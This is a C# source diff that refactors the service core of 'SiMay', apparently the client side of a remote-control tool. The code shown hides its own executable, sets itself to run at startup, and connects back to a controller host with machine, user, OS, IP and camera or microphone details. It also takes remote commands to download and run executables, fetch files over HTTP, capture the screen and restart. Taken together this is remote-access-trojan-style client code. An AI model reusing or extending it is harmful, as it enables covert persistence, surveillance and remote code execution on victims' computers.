@@ -32,90 +32,36 @@ namespace SiMay.ServiceCore
         private const int STATE_DISCONNECT = 0;
 
 
-        private int _currentSessionKeepStateSign = STATE_DISCONNECT;//主连接状态
+        private int _keepStateSign = STATE_DISCONNECT;//主连接状态
 
-        private int _screen_record_height;
-        private int _screen_record_width;
-        private int _screen_record_spantime;
-
-        private TcpClientSessionProvider _clientAgent;
         private ServiceTaskQueue _taskQueue = new ServiceTaskQueue();
-        //public MainService(StartParameterEx startParameter)
-        //{
-        //    while (true) //第一次解析域名,直至解析成功
-        //    {
-        //        var ip = HostHelper.GetHostByName(startParameter.Host);
-        //        if (ip != null)
-        //        {
-        //            AppConfiguartion.ServerIPEndPoint = new IPEndPoint(IPAddress.Parse(ip), startParameter.Port);
-        //            break;
-        //        }
-
-        //        Console.WriteLine(startParameter.Host ?? "address analysis is null");
-
-        //        Thread.Sleep(5000);
-        //    }
-        //    AppConfiguartion.HostAddress = startParameter.Host;
-        //    AppConfiguartion.HostPort = startParameter.Port;
-        //    AppConfiguartion.AccessKey = startParameter.AccessKey;
-        //    AppConfiguartion.DefaultRemarkInfo = startParameter.RemarkInformation;
-        //    AppConfiguartion.DefaultGroupName = startParameter.GroupName;
-        //    AppConfiguartion.IsAutoRun = startParameter.IsAutoStart;
-        //    AppConfiguartion.IsHideExcutingFile = startParameter.IsHide;
-        //    AppConfiguartion.RunTime = startParameter.RunTimeText;
-        //    AppConfiguartion.Version = startParameter.ServiceVersion;
-        //    AppConfiguartion.CenterServiceMode = startParameter.SessionMode == 1 ? true : false;
-        //    AppConfiguartion.IdentifyId = startParameter.UniqueId;
-
-        //    if (AppConfiguartion.IsHideExcutingFile)
-        //        SystemSessionHelper.FileHide(true);
-
-        //    if (AppConfiguartion.IsAutoRun)
-        //        SystemSessionHelper.SetAutoRun(true);
-
-        //    _screen_record_height = AppConfiguartion.ScreenRecordHeight;
-        //    _screen_record_width = AppConfiguartion.ScreenRecordWidth;
-        //    _screen_record_spantime = AppConfiguartion.ScreenRecordSpanTime;
-
-        //    //创建通讯接口实例
-        //    var clientConfig = new TcpSocketSaeaClientConfiguration();
-        //    if (!AppConfiguartion.CenterServiceMode)
-        //    {
-        //        //服务版配置
-        //        clientConfig.AppKeepAlive = true;
-        //        clientConfig.KeepAlive = false;
-        //    }
-        //    else
-        //    {
-        //        //中间服务器版服务端配置
-        //        clientConfig.AppKeepAlive = false;
-        //        clientConfig.KeepAlive = true;
-        //    }
-        //    clientConfig.KeepAliveInterval = 5000;
-        //    clientConfig.KeepAliveSpanTime = 1000;
-        //    clientConfig.CompressTransferFromPacket = false;
-
-        //    _clientAgent = TcpSocketsFactory.CreateClientAgent(SessionProviderContextType.Packet, clientConfig, Notify);
-        //    ConnectToServer();
-        //}
-
 
         /// <summary>
-        /// Loader专用构造函数
+        /// 启动参数
+        /// </summary>
+        public StartParameter StartParameter { get; set; }
+
+        /// <summary>
+        /// 会话提供
+        /// </summary>
+        public SessionProvider SessionProvider { get; set; }
+
+        /// <summary>
+        /// 远程服务器地址
+        /// </summary>
+        public IPEndPoint RemoteIPEndPoint { get; set; }
+
+        /// <summary>
+        /// 启动主服务
         /// </summary>
         /// <param name="startParameter"></param>
         /// <param name="clientAgent"></param>
         /// <param name="session"></param>
         /// <param name="serviceIPEndPoint"></param>
-        public MainApplicationService(
-            StartParameter startParameter,
-            TcpClientSessionProvider clientAgent,
-            SessionProviderContext session,
-            IPEndPoint serviceIPEndPoint,
-            bool hasSystemPermission)
+        public void StartService(SessionProviderContext session)
         {
-            _clientAgent = clientAgent;
-            _currentSessionKeepStateSign = 1;//主连接状态
+            _keepStateSign = STATE_NORMAL;//主连接状态
+
             this.SetSession(session);
 
             session.AppTokens = new object[2]
@@ -124,23 +70,21 @@ namespace SiMay.ServiceCore
                 null
             };
 
-            AppConfiguartion.HostAddress = startParameter.Host;
-            AppConfiguartion.HostPort = startParameter.Port;
-            AppConfiguartion.AccessKey = startParameter.AccessKey;
-            AppConfiguartion.DefaultRemarkInfo = startParameter.RemarkInformation;
-            AppConfiguartion.DefaultGroupName = startParameter.GroupName;
-            AppConfiguartion.IsAutoRun = startParameter.IsAutoStart;
-            AppConfiguartion.IsHideExcutingFile = startParameter.IsHide;
-            AppConfiguartion.RunTime = startParameter.RunTimeText;
-            AppConfiguartion.Version = startParameter.ServiceVersion;
-            AppConfiguartion.CenterServiceMode = startParameter.SessionMode == 1 ? true : false;
-            AppConfiguartion.IdentifyId = startParameter.UniqueId;
-            AppConfiguartion.ServerIPEndPoint = serviceIPEndPoint;
-            AppConfiguartion.ServiceDisplayName = startParameter.ServiceDisplayName;
-            AppConfiguartion.ServiceName = startParameter.ServiceName;
-            AppConfiguartion.HasSystemAuthority = hasSystemPermission;
-
-            //this.SendLoginPack(session);
+            AppConfiguartion.HostAddress = StartParameter.Host;
+            AppConfiguartion.HostPort = StartParameter.Port;
+            AppConfiguartion.AccessKey = StartParameter.AccessKey;
+            AppConfiguartion.DefaultRemarkInfo = StartParameter.RemarkInformation;
+            AppConfiguartion.DefaultGroupName = StartParameter.GroupName;
+            AppConfiguartion.IsAutoRun = StartParameter.IsAutoStart;
+            AppConfiguartion.IsHideExcutingFile = StartParameter.IsHide;
+            AppConfiguartion.RunTime = StartParameter.RunTimeText;
+            AppConfiguartion.Version = StartParameter.ServiceVersion;
+            AppConfiguartion.MiddleServiceMode = StartParameter.SessionMode == 1 ? true : false;
+            AppConfiguartion.IdentifyId = StartParameter.UniqueId;
+            AppConfiguartion.ServerIPEndPoint = RemoteIPEndPoint;
+            AppConfiguartion.ServiceDisplayName = StartParameter.ServiceDisplayName;
+            AppConfiguartion.ServiceName = StartParameter.ServiceName;
+            AppConfiguartion.SystemPermission = StartParameter.SystemPermission;
         }
 
         private void ConnectToServer()
@@ -153,7 +97,7 @@ namespace SiMay.ServiceCore
                     return;
                 AppConfiguartion.ServerIPEndPoint = new IPEndPoint(IPAddress.Parse(ip), AppConfiguartion.HostPort);
             });
-            _clientAgent.ConnectAsync(AppConfiguartion.ServerIPEndPoint);
+            SessionProvider.ConvertTo<TcpClientSessionProvider>().ConnectAsync(AppConfiguartion.ServerIPEndPoint);
         }
 
         /// <summary>
@@ -164,7 +108,7 @@ namespace SiMay.ServiceCore
         private void SendACK(SessionProviderContext session, ConnectionWorkType type, long accessId)
         {
             session.SendTo(MessageHead.C_GLOBAL_CONNECT,
-                new AckPack()
+                new AcknowledPacket()
                 {
                     AccessId = accessId,//当前主控端标识
                     AccessKey = AppConfiguartion.AccessKey,
@@ -226,7 +170,7 @@ namespace SiMay.ServiceCore
         private void ConnectedHandler(SessionProviderContext session, TcpSessionNotify notify)
         {
             //当服务主连接离线或未连接，优先与session关联
-            if (Interlocked.Exchange(ref _currentSessionKeepStateSign, STATE_NORMAL) == STATE_DISCONNECT)
+            if (Interlocked.Exchange(ref _keepStateSign, STATE_NORMAL) == STATE_DISCONNECT)
             {
                 session.AppTokens = new object[2]
                 {
@@ -258,7 +202,7 @@ namespace SiMay.ServiceCore
         }
         private void CloseHandler(SessionProviderContext session, TcpSessionNotify notify)
         {
-            if (_currentSessionKeepStateSign == STATE_DISCONNECT && session.AppTokens.IsNull())
+            if (_keepStateSign == STATE_DISCONNECT && session.AppTokens.IsNull())
             {
                 //服务主连接断开或未连接
                 session.AppTokens = new object[2]
@@ -267,7 +211,7 @@ namespace SiMay.ServiceCore
                     null
                 };
             }
-            else if (_currentSessionKeepStateSign == STATE_NORMAL && session.AppTokens.IsNull())//task连接，连接服务器失败
+            else if (_keepStateSign == STATE_NORMAL && session.AppTokens.IsNull())//task连接，连接服务器失败
             {
                 _taskQueue.Dequeue();
                 return;//不重试连接，因为可能会连接不上，导致频繁重试连接
@@ -278,7 +222,7 @@ namespace SiMay.ServiceCore
             {
                 //清除主连接会话信息
                 this.SetSession(null);
-                Interlocked.Exchange(ref _currentSessionKeepStateSign, STATE_DISCONNECT);
+                Interlocked.Exchange(ref _keepStateSign, STATE_DISCONNECT);
 
                 var timer = new System.Timers.Timer();
                 timer.Interval = 5000;
@@ -301,34 +245,40 @@ namespace SiMay.ServiceCore
                 appService.SessionClosed();
             }
         }
-        private void PostTaskToQueue(ApplicationRemoteService service)
+
+        /// <summary>
+        /// 将服务加入到等待队列并发起工作连接
+        /// </summary>
+        /// <param name="service"></param>
+        private void PostWorkServiceToAwaitQueue(ApplicationRemoteService service)
         {
             this._taskQueue.Enqueue(service);
             this.ConnectToServer();
         }
 
-        [PacketHandler(MessageHead.S_MAIN_ACTIVATE_APPLICATIONSERVICE)]
+        [PacketHandler(MessageHead.S_MAIN_ACTIVATE_APPLICATION_SERVICE)]
         private void ActivateApplicationService(SessionProviderContext session)
         {
             var activateServicePack = session.GetMessageEntity<ActivateServicePack>();
-            string key = activateServicePack.ApplicationKey;
+            string applicationKey = activateServicePack.CommandText.Split('.').Last<string>();
 
             //获取当前消息发送源主控端标识
             long accessId = session.GetAccessId();
-            var context = SysUtil.ControlTypes.FirstOrDefault(x => x.ServiceKey.Equals(key));
-            if (context != null)
+            var context = SysUtil.ServiceTypes.FirstOrDefault(x => x.ServiceKey.Equals(applicationKey));
+            if (!context.IsNull())
             {
-                var serviceName = context.AppServiceType.GetCustomAttribute<ServiceNameAttribute>(true);
+                var serviceName = context.ApplicationServiceType.GetCustomAttribute<ServiceNameAttribute>(true);
                 SystemMessageNotify.ShowTip($"正在进行远程操作:{(serviceName.IsNull() ? context.ServiceKey : serviceName.Name) }");
-                var appService = Activator.CreateInstance(context.AppServiceType, null) as ApplicationRemoteService;
-                appService.AppServiceKey = context.ServiceKey;
-                appService.AccessId = accessId;
-                this.PostTaskToQueue(appService);
+                var applicationService = Activator.CreateInstance(context.ApplicationServiceType, null) as ApplicationRemoteService;
+                applicationService.ApplicationKey = context.ServiceKey;
+                applicationService.ActivatedCommandText = activateServicePack.CommandText;
+                applicationService.AccessId = accessId;
+                this.PostWorkServiceToAwaitQueue(applicationService);
             }
         }
 
         [PacketHandler(MessageHead.S_MAIN_REMARK)]
-        private void SetRemarkInfo(SessionProviderContext session)
+        private void SetDesInfo(SessionProviderContext session)
         {
             var des = session.GetMessage().ToUnicodeString();
             AppConfiguartion.RemarkInfomation = des;
@@ -343,22 +293,20 @@ namespace SiMay.ServiceCore
 
         [PacketHandler(MessageHead.S_MAIN_SESSION)]
         private void SetSystemSession(SessionProviderContext session)
-        {
-            SystemHelper.SetSessionStatus(session.GetMessage()[0]);
-        }
+            => SystemHelper.SetSessionStatus(session.GetMessage()[0]);
+
 
         [PacketHandler(MessageHead.S_MAIN_RELOADER)]
         private void ReLoader(SessionProviderContext session)
-        {
-            Application.Restart();
-        }
+            => Application.Restart();
+
 
         [PacketHandler(MessageHead.S_MAIN_UPDATE)]
         private void UpdateService(SessionProviderContext session)
         {
             try
             {
-                var pack = session.GetMessageEntity<RemoteUpdatePack>();
+                var pack = session.GetMessageEntity<RemoteUpdatePacket>();
 
                 string tempFile = this.GetTempFilePath(".exe");
                 if (pack.UrlOrFileUpdate == RemoteUpdateType.File)
@@ -447,9 +395,8 @@ namespace SiMay.ServiceCore
 
         [PacketHandler(MessageHead.S_MAIN_HTTPDOWNLOAD)]
         private void HttpDownloadExecute(SessionProviderContext session)
-        {
-            AppDownloaderHelper.DownloadFile(session.GetMessage());
-        }
+            => AppDownloaderHelper.DownloadFile(session.GetMessage());
+
 
         [PacketHandler(MessageHead.S_MAIN_OPEN_WEBURL)]
         private void OpenUrl(SessionProviderContext session)
@@ -481,8 +428,8 @@ namespace SiMay.ServiceCore
             //{
             //var args = c.ConvertTo<object[]>();
             //var accessId = args[0].ConvertTo<long>();
-            var get = session.GetMessageEntity<DesktopViewGetFramePack>();
-            if (get.Width == 0 || get.Height == 0 /*|| get.TimeSpan == 0 || get.TimeSpan < 50*/)
+            var getView = session.GetMessageEntity<DesktopViewGetFramePacket>();
+            if (getView.Width == 0 || getView.Height == 0 /*|| get.TimeSpan == 0 || get.TimeSpan < 50*/)
                 return;
 
             //Thread.SetData(Thread.GetNamedDataSlot("AccessId"), accessId);
@@ -493,7 +440,7 @@ namespace SiMay.ServiceCore
                     new DesktopViewFramePack()
                     {
                         //InVisbleArea = get.InVisbleArea,
-                        ViewData = ImageExtensionHelper.CaptureNoCursorToBytes(new Size(get.Width, get.Height))
+                        ViewData = ImageExtensionHelper.CaptureNoCursorToBytes(new Size(getView.Width, getView.Height))
                     });
 
             //session.SendTo(SysMessageConstructionHelper.WrapAccessId(data, accessId));
@@ -567,7 +514,7 @@ namespace SiMay.ServiceCore
         [PacketHandler(MessageHead.S_MAIN_MESSAGEBOX)]
         private void ShowMessageBox(SessionProviderContext session)
         {
-            var msg = session.GetMessageEntity<MessagePack>();
+            var msg = session.GetMessageEntity<MessagePacket>();
             ThreadHelper.CreateThread(() =>
             {
                 string title = msg.MessageTitle;
@@ -599,20 +546,18 @@ namespace SiMay.ServiceCore
         [PacketHandler(MessageHead.S_GLOBAL_OK)]
         private void SendLoginPack(SessionProviderContext session)
         {
-
             var loginResult = GatherLoginPacketBuilder();
             session.SendTo(MessageHead.C_MAIN_LOGIN, loginResult);
         }
 
-        private LoginPack GatherLoginPacketBuilder(bool assemblyLoadCompleted = false)
+        private LoginPacket GatherLoginPacketBuilder(bool assemblyLoadCompleted = false)
         {
             string remarkInfomation = AppConfiguartion.RemarkInfomation ?? AppConfiguartion.DefaultRemarkInfo;
             string groupName = AppConfiguartion.GroupName ?? AppConfiguartion.DefaultGroupName;
-            bool openScreenWall = AppConfiguartion.IsOpenScreenView;//默认为打开屏幕墙
-            bool openScreenRecord = AppConfiguartion.IsScreenRecord; //默认屏幕记录
+            bool openScreenView = AppConfiguartion.IsOpenScreenView;//默认为打开屏幕墙
 
-            var loginPack = new LoginPack();
-            loginPack.IPV4 = GetSystemInforHelper.GetLocalIPV4();
+            var loginPack = new LoginPacket();
+            loginPack.IPV4 = GetSystemInforHelper.GetLocalIPv4();
             loginPack.MachineName = Environment.MachineName ?? string.Empty;
             loginPack.Remark = remarkInfomation;
             loginPack.ProcessorCount = Environment.ProcessorCount;
@@ -623,15 +568,11 @@ namespace SiMay.ServiceCore
             loginPack.UserName = Environment.UserName.ToString();
             loginPack.OSVersion = GetSystemInforHelper.GetOSFullName;
             loginPack.GroupName = groupName;
-            loginPack.OpenScreenWall = openScreenWall;
+            loginPack.OpenScreenView = openScreenView;
             loginPack.ExistCameraDevice = GetSystemInforHelper.ExistCameraDevice();
             loginPack.ExitsRecordDevice = GetSystemInforHelper.ExistRecordDevice();
             loginPack.ExitsPlayerDevice = GetSystemInforHelper.ExistPlayDevice();
             loginPack.IdentifyId = AppConfiguartion.IdentifyId;
-            loginPack.OpenScreenRecord = openScreenRecord;
-            loginPack.RecordHeight = _screen_record_height;
-            loginPack.RecordWidth = _screen_record_width;
-            loginPack.RecordSpanTime = _screen_record_spantime;
             loginPack.InitialAssemblyLoad = assemblyLoadCompleted;
 
             return loginPack;
